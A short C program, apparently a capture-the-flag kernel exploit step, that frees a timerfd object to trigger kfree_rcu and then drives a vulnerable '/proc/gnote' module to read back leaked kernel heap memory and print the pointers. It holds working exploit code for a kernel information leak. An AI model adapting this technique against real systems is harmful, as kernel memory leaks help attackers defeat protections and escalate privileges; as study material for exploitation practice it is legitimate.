#include<unistd.h>
#include<stdio.h>
#include<stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/timerfd.h>
#include<fcntl.h>
#include<stdio.h>

int main(void){
  int fd = open("/proc/gnote",O_RDWR);
  struct itimerspec timespec = { {0, 0}, {100, 0}};
  int tfd = timerfd_create(CLOCK_REALTIME, 0);
  unsigned add[2] = {0x1,0x100};
  unsigned select[2] = {0x5,0x0};
  char buf[256] = "AAAAAAAA";
  long long a;
  int b;

  timerfd_settime(tfd, 0, &timespec, 0);
  close(tfd); //triger kfree_rcu()
  sleep(1);
  write(fd,add,sizeof(add));
  sleep(1);
  write(fd,select,sizeof(select));
  sleep(1);
  b = read(fd,buf,100);
  printf("read bytes: %d\n",b);
  if(b<=0){
    printf("read failed\n");
    return 1;
  }
  printf("hex: \n");
  for(long long *ptr=buf;*ptr!=100/8;++ptr){
    a = *ptr;
    printf("0x%llx\n",a);
  }
  printf("\n");

  return 0;
}
